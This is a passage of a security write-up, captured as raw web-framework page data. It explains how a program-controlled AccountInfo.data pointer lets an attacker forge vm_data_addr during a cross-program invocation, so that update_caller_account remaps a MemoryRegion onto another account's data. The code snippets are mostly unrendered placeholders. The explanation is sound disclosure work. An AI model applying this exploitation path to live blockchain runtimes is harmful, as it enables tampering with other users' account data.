token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"self\"]}],\"$L672\",\"$L673\",\"$L674\",\"$L675\",\"$L676\",\"$L677\",\"$L678\",\"$L679\",\"$L67a\",\"$L67b\",\"$L67c\",\"$L67d\",\"$L67e\",\"$L67f\",\"$L680\",\"$L681\",\"$L682\",\"$L683\",\"$L684\",\"$L685\",\"$L686\",\"$L687\",\"$L688\",\"$L689\",\"$L68a\",\"$L68b\",\"$L68c\",\"$L68d\",\"$L68e\",\"$L68f\",\"$L690\",\"$L691\",\"$L692\",\"$L693\",\"$L694\",\"$L695\",\"$L696\",\"$L697\",\"$L698\",\"$L699\",\"$L69a\",\"$L69b\",\"$L69c\",\"$L69d\",\"$L69e\",\"$L69f\",\"$L6a0\",\"$L6a1\",\"$L6a2\",\"$L6a3\",\"$L6a4\",\"$L6a5\",\"$L6a6\",\"$L6a7\",\"$L6a8\",\"$L6a9\",\"$L6aa\",\"$L6ab\",\"$L6ac\",\"$L6ad\",\"$L6ae\",\"$L6af\",\"$L6b0\",\"$L6b1\",\"$L6b2\",\"$L6b3\",\"$L6b4\",\"$L6b5\",\"$L6b6\",\"$L6b7\",\"$L6b8\",\"$L6b9\",\"$L6ba\",\"$L6bb\",\"$L6bc\",\"$L6bd\",\"$L6be\",\"$L6bf\",\"$L6c0\",\"$L6c1\",\"$L6c2\",\"$L6c3\",\"$L6c4\",\"$L6c5\",\"$L6c6\",\"$L6c7\",\"$L6c8\",\"$L6c9\",\"$L6ca\",\"$L6cb\",\"$L6cc\",\"$L6cd\",\"$L6ce\",\"$L6cf\",\"$L6d0\",\"$L6d1\",\"$L6d2\",\"$L6d3\",\"$L6d4\",\"$L6d5\",\"$L6d6\",\"$L6d7\",\"$L6d8\",\"$L6d9\",\"$L6da\",\"$L6db\",\"$L6dc\",\"$L6dd\",\"$L6de\",\"$L6df\",\"$L6e0\",\"$L6e1\",\"$L6e2\",\"$L6e3\",\"$L6e4\",\"$L6e5\",\"$L6e6\",\"$L6e7\",\"$L6e8\",\"$L6e9\",\"$L6ea\",\"$L6eb\",\"$L6ec\",\"$L6ed\",\"$L6ee\",\"$L6ef\",\"$L6f0\",\"$L6f1\",\"$L6f2\",\"$L6f3\",\"$L6f4\",\"$L6f5\",\"$L6f6\",\"$L6f7\",\"$L6f8\",\"$L6f9\",\"$L6fa\",\"$L6fb\",\"$L6fc\",\"$L6fd\",\"$L6fe\",\"$L6ff\",\"$L700\",\"$L701\",\"$L702\",\"$L703\",\"$L704\",\"$L705\",\"$L706\",\"$L707\",\"$L708\",\"$L709\",\"$L70a\",\"$L70b\",\"$L70c\",\"$L70d\",\"$L70e\",\"$L70f\",\"$L710\",\"$L711\",\"$L712\",\"$L713\",\"$L714\",\"$L715\",\"$L716\",\"$L717\",\"$L718\",\"$L719\",\"$L71a\",\"$L71b\",\"$L71c\",\"$L71d\",\"$L71e\",\"$L71f\",\"$L720\",\"$L721\",\"$L722\",\"$L723\",\"$L724\",\"$L725\",\"$L726\",\"$L727\",\"$L728\",\"$L729\",\"$L72a\",\"$L72b\",\"$L72c\",\"$L72d\",\"$L72e\",\"$L72f\",\"$L730\",\"$L731\",\"$L732\",\"$L733\",\"$L734\",\"$L735\",\"$L736\",\"$L737\",\"$L738\",\"$L739\",\"$L73a\",\"$L73b\",\"$L73c\",\"$L73d\",\"$L73e\",\"$L73f\",\"$L740\",\"$L741\",\"$L742\",\"$L743\",\"$L744\",\"$L745\",\"$L746\",\"$L747\",\"$L748\",\"$L749\",\"$L74a\",\"$L74b\",\"$L74c\",\"$L74d\",\"$L74e\",\"$L74f\",\"$L750\",\"$L751\",\"$L752\",\"$L753\",\"$L754\",\"$L755\",\"$L756\",\"$L757\",\"$L758\",\"$L759\",\"$L75a\",\"$L75b\",\"$L75c\",\"$L75d\",\"$L75e\",\"$L75f\",\"$L760\",\"$L761\",\"$L762\",\"$L763\",\"$L764\",\"$L765\",\"$L766\",\"$L767\",\"$L768\",\"$L769\",\"$L76a\",\"$L76b\"]]}]}]]}]}]\n"])</script><script>self.__next_f.push([1,"a1:[\"$\",\"h2\",\"h2-6\",{\"className\":\"text-3xl sm:text-4xl mt-8 mb-3 pb-2 border-b border-white/10 text-white text-glow\",\"children\":\"The Vulnerability\"}]\n"])</script><script>self.__next_f.push([1,"a2:[\"$\",\"p\",\"p-96\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"So how are \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion.host_addr\"}],\" updates implemented? The \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"update_caller_account()\"}],\" function needs to detect when account data has been relocated due to CoW operations and update the corresponding memory regions.\"]}]\n"])</script><script>self.__next_f.push([1,"a3:[\"$\",\"pre\",\"pre-11\",{\"children\":[\"$\",\"div\",\"code-0\",{\"className\":\"relative my-6 border border-white/10 bg-black/60\",\"children\":[[\"$\",\"div\",null,{\"className\":\"absolute -top-3 left-4 px-2 bg-[#050505] text-xs tracking-[0.2em] text-white/40 font-mono uppercase\",\"children\":[\":: \",\"RUST\"]}],[\"$\",\"div\",null,{\"className\":\"rounded-sm !bg-transparent !m-0\",\"style\":{\"color\":\"#ccc\",\"background\":\"#0a0a0a\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"whiteSpace\":\"pre\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\",\"padding\":\"1em\",\"margin\":\".5em 0\",\"overflow\":\"auto\",\"border\":\"1px solid rgba(255, 255, 255, 0.15)\",\"boxShadow\":\"0 0 20px rgba(255, 255, 255, 0.03), inset 0 0 30px rgba(0, 0, 0, 0.5)\"},\"children\":[\"$\",\"code\",null,{\"className\":\"language-rust\",\"style\":{\"whiteSpace\":\"pre\",\"color\":\"#e0e0e0\",\"background\":\"none\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\"},\"children\":[false,[[\"$\",\"span\",\"line-number--1\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[1]}],[\"$\",\"span\",\"code-segment-1\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"impl\"]}],[\"$\",\"span\",\"code-segment-2\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segment-3\",{\"className\":\"token token lifetime-annotation\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"'a\"]}],[\"$\",\"span\",\"code-segment-4\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segment-5\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-6\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"UnalignedMemoryMapping\"]}],[\"$\",\"span\",\"code-segment-7\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segment-8\",{\"className\":\"token token lifetime-annotation\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"'a\"]}],[\"$\",\"span\",\"code-segment-9\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segment-10\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-11\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segment-12\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--2\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[2]}],[\"$\",\"span\",\"code-segment-14\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segment-15\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"...\"]}],[\"$\",\"span\",\"code-segment-16\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--3\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[3]}],[\"$\",\"span\",\"code-segment-18\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segment-19\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segment-20\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-21\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"fn\"]}],[\"$\",\"span\",\"code-segment-22\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-23\",{\"className\":\"token token function-definition\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"region\"]}],[\"$\",\"span\",\"code-segment-24\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],\"$L76c\",\"$L76d\",\"$L76e\",\"$L76f\",\"$L770\",\"$L771\",\"$L772\",\"$L773\",\"$L774\",\"$L775\",\"$L776\",\"$L777\",\"$L778\",\"$L779\",\"$L77a\",\"$L77b\",\"$L77c\",\"$L77d\",\"$L77e\",\"$L77f\",\"$L780\",\"$L781\",\"$L782\",\"$L783\",\"$L784\",\"$L785\",\"$L786\",\"$L787\",\"$L788\",\"$L789\",\"$L78a\",\"$L78b\",\"$L78c\",\"$L78d\",\"$L78e\",\"$L78f\",\"$L790\",\"$L791\",\"$L792\",\"$L793\",\"$L794\",\"$L795\",\"$L796\",\"$L797\",\"$L798\",\"$L799\",\"$L79a\",\"$L79b\",\"$L79c\",\"$L79d\",\"$L79e\",\"$L79f\",\"$L7a0\",\"$L7a1\",\"$L7a2\",\"$L7a3\",\"$L7a4\",\"$L7a5\",\"$L7a6\",\"$L7a7\",\"$L7a8\",\"$L7a9\",\"$L7aa\",\"$L7ab\",\"$L7ac\",\"$L7ad\",\"$L7ae\",\"$L7af\",\"$L7b0\",\"$L7b1\",\"$L7b2\",\"$L7b3\",\"$L7b4\",\"$L7b5\",\"$L7b6\",\"$L7b7\",\"$L7b8\",\"$L7b9\",\"$L7ba\",\"$L7bb\",\"$L7bc\",\"$L7bd\",\"$L7be\",\"$L7bf\",\"$L7c0\",\"$L7c1\",\"$L7c2\",\"$L7c3\",\"$L7c4\",\"$L7c5\",\"$L7c6\",\"$L7c7\",\"$L7c8\",\"$L7c9\",\"$L7ca\",\"$L7cb\",\"$L7cc\",\"$L7cd\",\"$L7ce\",\"$L7cf\",\"$L7d0\",\"$L7d1\",\"$L7d2\",\"$L7d3\",\"$L7d4\",\"$L7d5\",\"$L7d6\",\"$L7d7\",\"$L7d8\",\"$L7d9\",\"$L7da\",\"$L7db\",\"$L7dc\",\"$L7dd\",\"$L7de\",\"$L7df\",\"$L7e0\",\"$L7e1\",\"$L7e2\",\"$L7e3\",\"$L7e4\",\"$L7e5\",\"$L7e6\",\"$L7e7\",\"$L7e8\",\"$L7e9\",\"$L7ea\",\"$L7eb\",\"$L7ec\",\"$L7ed\",\"$L7ee\",\"$L7ef\",\"$L7f0\",\"$L7f1\",\"$L7f2\",\"$L7f3\",\"$L7f4\",\"$L7f5\",\"$L7f6\",\"$L7f7\",\"$L7f8\",\"$L7f9\",\"$L7fa\",\"$L7fb\",\"$L7fc\",\"$L7fd\",\"$L7fe\",\"$L7ff\",\"$L800\",\"$L801\",\"$L802\",\"$L803\",\"$L804\",\"$L805\",\"$L806\",\"$L807\",\"$L808\",\"$L809\",\"$L80a\",\"$L80b\",\"$L80c\",\"$L80d\",\"$L80e\",\"$L80f\",\"$L810\",\"$L811\",\"$L812\",\"$L813\",\"$L814\",\"$L815\",\"$L816\",\"$L817\",\"$L818\",\"$L819\",\"$L81a\",\"$L81b\",\"$L81c\",\"$L81d\",\"$L81e\",\"$L81f\",\"$L820\",\"$L821\",\"$L822\",\"$L823\",\"$L824\",\"$L825\",\"$L826\",\"$L827\",\"$L828\",\"$L829\",\"$L82a\",\"$L82b\",\"$L82c\",\"$L82d\",\"$L82e\",\"$L82f\",\"$L830\",\"$L831\",\"$L832\",\"$L833\",\"$L834\",\"$L835\",\"$L836\",\"$L837\",\"$L838\",\"$L839\",\"$L83a\",\"$L83b\",\"$L83c\",\"$L83d\",\"$L83e\",\"$L83f\",\"$L840\",\"$L841\",\"$L842\",\"$L843\",\"$L844\",\"$L845\",\"\\n\",\"$L846\",\"$L847\",\"$L848\",\"$L849\",\"$L84a\",\"$L84b\",\"$L84c\",\"$L84d\",\"$L84e\",\"$L84f\",\"$L850\",\"$L851\",\"$L852\",\"$L853\",\"$L854\",\"$L855\",\"$L856\",\"$L857\",\"$L858\",\"$L859\",\"$L85a\",\"$L85b\",\"$L85c\",\"$L85d\",\"$L85e\",\"$L85f\",\"$L860\",\"$L861\",\"$L862\",\"$L863\",\"$L864\",\"$L865\",\"$L866\",\"$L867\",\"$L868\",\"$L869\",\"$L86a\",\"$L86b\",\"$L86c\",\"$L86d\",\"$L86e\",\"$L86f\",\"$L870\",\"$L871\",\"$L872\",\"$L873\",\"$L874\",\"$L875\",\"$L876\",\"$L877\",\"$L878\",\"$L879\",\"$L87a\",\"$L87b\",\"$L87c\",\"$L87d\",\"$L87e\",\"$L87f\",\"$L880\",\"$L881\",\"$L882\",\"$L883\",\"$L884\",\"$L885\",\"$L886\",\"$L887\",\"$L888\",\"$L889\",\"$L88a\",\"$L88b\",\"$L88c\",\"$L88d\",\"$L88e\",\"$L88f\",\"$L890\",\"$L891\",\"$L892\",\"$L893\",\"$L894\",\"$L895\",\"$L896\",\"$L897\",\"$L898\",\"$L899\",\"$L89a\",\"$L89b\",\"$L89c\",\"$L89d\",\"\\n\",\"$L89e\",\"$L89f\",\"$L8a0\",\"$L8a1\",\"$L8a2\",\"$L8a3\",\"$L8a4\",\"$L8a5\",\"$L8a6\",\"$L8a7\",\"$L8a8\",\"$L8a9\",\"$L8aa\",\"$L8ab\",\"$L8ac\",\"$L8ad\",\"$L8ae\",\"$L8af\",\"$L8b0\",\"$L8b1\",\"$L8b2\",\"$L8b3\",\"$L8b4\",\"$L8b5\",\"$L8b6\",\"$L8b7\",\"$L8b8\",\"$L8b9\",\"$L8ba\",\"$L8bb\",\"$L8bc\",\"$L8bd\",\"$L8be\",\"$L8bf\",\"$L8c0\",\"$L8c1\",\"$L8c2\",\"$L8c3\",\"$L8c4\",\"$L8c5\",\"$L8c6\",\"$L8c7\",\"$L8c8\",\"$L8c9\",\"$L8ca\",\"$L8cb\",\"$L8cc\",\"$L8cd\",\"$L8ce\",\"$L8cf\",\"$L8d0\",\"$L8d1\",\"$L8d2\",\"$L8d3\",\"$L8d4\",\"$L8d5\",\"$L8d6\",\"$L8d7\",\"$L8d8\",\"$L8d9\",\"$L8da\",\"$L8db\",\"$L8dc\",\"$L8dd\",\"$L8de\",\"$L8df\",\"$L8e0\",\"$L8e1\",\"$L8e2\",\"$L8e3\",\"$L8e4\",\"$L8e5\",\"$L8e6\",\"$L8e7\",\"$L8e8\",\"$L8e9\",\"$L8ea\",\"$L8eb\",\"$L8ec\",\"$L8ed\",\"$L8ee\",\"$L8ef\",\"$L8f0\",\"$L8f1\",\"$L8f2\",\"$L8f3\",\"$L8f4\",\"$L8f5\",\"$L8f6\",\"$L8f7\",\"$L8f8\"]]}]}]]}]}]\n"])</script><script>self.__next_f.push([1,"a4:[\"$\",\"p\",\"p-97\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"The immediate question is, does the invariant of correct identification of \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion\"}],\" hold?\"]}]\n"])</script><script>self.__next_f.push([1,"a5:[\"$\",\"p\",\"p-98\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"The answer is no. Recall \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"CallerAccount.vm_data_addr\"}],\" comes directly from \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"AccountInfo.data.as_ptr()\"}],\" in the VM's heap memory - memory that programs have complete control over.\"]}]\n"])</script><script>self.__next_f.push([1,"a6:[\"$\",\"pre\",\"pre-12\",{\"children\":[\"$\",\"div\",\"code-0\",{\"className\":\"relative my-6 border border-white/10 bg-black/60\",\"children\":[[\"$\",\"div\",null,{\"className\":\"absolute -top-3 left-4 px-2 bg-[#050505] text-xs tracking-[0.2em] text-white/40 font-mono uppercase\",\"children\":[\":: \",\"RUST\"]}],[\"$\",\"div\",null,{\"className\":\"rounded-sm !bg-transparent !m-0\",\"style\":{\"color\":\"#ccc\",\"background\":\"#0a0a0a\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"whiteSpace\":\"pre\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\",\"padding\":\"1em\",\"margin\":\".5em 0\",\"overflow\":\"auto\",\"border\":\"1px solid rgba(255, 255, 255, 0.15)\",\"boxShadow\":\"0 0 20px rgba(255, 255, 255, 0.03), inset 0 0 30px rgba(0, 0, 0, 0.5)\"},\"children\":[\"$\",\"code\",null,{\"className\":\"language-rust\",\"style\":{\"whiteSpace\":\"pre\",\"color\":\"#e0e0e0\",\"background\":\"none\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\"},\"children\":[false,[[\"$\",\"span\",\"line-number--1\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[1]}],[\"$\",\"span\",\"code-segment-1\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"fn\"]}],[\"$\",\"span\",\"code-segment-2\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-3\",{\"className\":\"token token function-definition\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"from_account_info\"]}],[\"$\",\"span\",\"code-segment-4\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segment-5\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--2\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[2]}],[\"$\",\"span\",\"code-segment-7\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    invoke_context\"]}],[\"$\",\"span\",\"code-segment-8\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segment-9\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-10\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segment-11\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"InvokeContext\"]}],[\"$\",\"span\",\"code-segment-12\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segment-13\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--3\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[3]}],[\"$\",\"span\",\"code-segment-15\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    memory_mapping\"]}],[\"$\",\"span\",\"code-segment-16\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segment-17\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-18\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segment-19\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MemoryMapping\"]}],[\"$\",\"span\",\"code-segment-20\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segment-21\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--4\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[4]}],\"$L8f9\",\"$L8fa\",\"$L8fb\",\"$L8fc\",\"$L8fd\",\"$L8fe\",\"$L8ff\",\"$L900\",\"$L901\",\"$L902\",\"$L903\",\"$L904\",\"$L905\",\"$L906\",\"$L907\",\"$L908\",\"$L909\",\"$L90a\",\"$L90b\",\"$L90c\",\"$L90d\",\"$L90e\",\"$L90f\",\"$L910\",\"$L911\",\"$L912\",\"$L913\",\"$L914\",\"$L915\",\"$L916\",\"$L917\",\"$L918\",\"$L919\",\"$L91a\",\"$L91b\",\"$L91c\",\"$L91d\",\"$L91e\",\"$L91f\",\"$L920\",\"$L921\",\"$L922\",\"$L923\",\"$L924\",\"$L925\",\"$L926\",\"$L927\",\"$L928\",\"$L929\",\"$L92a\",\"$L92b\",\"$L92c\",\"\\n\",\"$L92d\",\"$L92e\",\"$L92f\",\"$L930\",\"$L931\",\"$L932\",\"$L933\",\"$L934\",\"$L935\",\"$L936\",\"$L937\",\"$L938\",\"$L939\",\"$L93a\",\"$L93b\",\"$L93c\",\"$L93d\",\"$L93e\",\"$L93f\",\"$L940\",\"$L941\",\"$L942\",\"$L943\",\"$L944\",\"$L945\",\"$L946\",\"$L947\",\"$L948\",\"$L949\",\"$L94a\",\"$L94b\",\"$L94c\",\"$L94d\",\"$L94e\",\"$L94f\",\"$L950\",\"$L951\",\"$L952\",\"$L953\",\"$L954\",\"$L955\",\"$L956\",\"$L957\",\"$L958\",\"$L959\",\"$L95a\",\"$L95b\",\"$L95c\",\"$L95d\",\"$L95e\",\"$L95f\",\"$L960\",\"$L961\",\"$L962\",\"$L963\",\"$L964\",\"$L965\",\"$L966\",\"$L967\",\"$L968\",\"$L969\",\"$L96a\",\"$L96b\",\"$L96c\",\"$L96d\",\"$L96e\",\"$L96f\",\"$L970\",\"$L971\",\"$L972\",\"$L973\",\"$L974\",\"$L975\",\"$L976\",\"$L977\",\"$L978\",\"$L979\",\"\\n\",\"$L97a\",\"$L97b\",\"$L97c\",\"$L97d\",\"$L97e\",\"\\n\",\"$L97f\",\"$L980\",\"$L981\",\"$L982\",\"$L983\",\"$L984\",\"$L985\",\"$L986\",\"$L987\",\"$L988\",\"$L989\",\"$L98a\",\"$L98b\",\"$L98c\",\"$L98d\",\"$L98e\",\"$L98f\",\"$L990\",\"$L991\",\"$L992\",\"$L993\",\"$L994\",\"$L995\",\"$L996\",\"$L997\",\"$L998\",\"$L999\",\"$L99a\",\"$L99b\",\"$L99c\",\"\\n\",\"$L99d\",\"$L99e\",\"$L99f\",\"$L9a0\",\"$L9a1\",\"$L9a2\",\"$L9a3\",\"$L9a4\",\"$L9a5\",\"$L9a6\",\"$L9a7\",\"$L9a8\",\"$L9a9\",\"$L9aa\",\"$L9ab\",\"$L9ac\",\"$L9ad\",\"$L9ae\",\"$L9af\",\"$L9b0\",\"$L9b1\",\"$L9b2\",\"$L9b3\",\"$L9b4\"]]}]}]]}]}]\n"])</script><script>self.__next_f.push([1,"a7:[\"$\",\"p\",\"p-99\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"By manipulating the \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"AccountInfo.data\"}],\" pointer in VM memory before triggering a CPI call, an attacker can forge the \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"vm_data_addr\"}],\" value. This causes \",[\"$\",\"code\",\"code-2\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"update_caller_account\"}],\" to locate the wrong \",[\"$\",\"code\",\"code-3\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion\"}],\" and update its \",[\"$\",\"code\",\"code-4\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"host_addr\"}],\" to point to the attacker's target account data, effectively mapping the virtual memory of some \",[\"$\",\"code\",\"code-5\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion\"}],\" to a wrong host memory.\"]}]\n"])</script><script>self.__next_f.push([1,"a8:[\"$\",\"h2\",\"h2-7\",{\"className\":\"text-3xl sm:text-4xl mt-8 mb-3 pb-2 border-b border-white/10 text-white 